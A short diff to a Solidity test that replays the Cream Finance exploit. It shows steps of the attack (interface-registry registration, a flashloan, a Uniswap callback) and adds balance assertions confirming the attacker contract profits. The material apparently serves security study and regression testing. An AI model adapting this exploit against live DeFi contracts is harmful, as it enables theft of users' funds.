@@ -64,6 +64,10 @@ contract Exploit_CreamFinance is TestHarness, TokenBalanceTracker {
 
     function test_attack() external {
         console.log('===== STEP 1: INCLUDE THE ATTACKER CONTRACT IN THE INTERFACE REGISTY =====');
+
+        uint256 balanceBeforeWETH = weth.balanceOf(address(this));
+        uint256 balanceBeforeAMP = amp.balanceOf(address(this));
+
         interfaceRegistry.setInterfaceImplementer(address(this), TOKENS_RECIPIENT_INTERFACE_HASH, address(this));
 
         console.log('===== STEP 2: REQUEST FLASHLOAN =====');
@@ -79,6 +83,11 @@ contract Exploit_CreamFinance is TestHarness, TokenBalanceTracker {
 
         logBalancesWithLabel('Attacker Contract', address(this));
         logBalancesWithLabel('Attacker EOA', msg.sender);
+
+        uint256 balanceAfterWETH = weth.balanceOf(address(this));
+        uint256 balanceAfterAMP = amp.balanceOf(address(this));
+        assertGe(balanceAfterWETH, balanceBeforeWETH);
+        assertGe(balanceAfterAMP, balanceBeforeAMP);
     }
 
     function uniswapV2Call(address sender, uint256 /* /wiseLoanAmt */, uint256 wethLoanAmt, bytes calldata ) external {
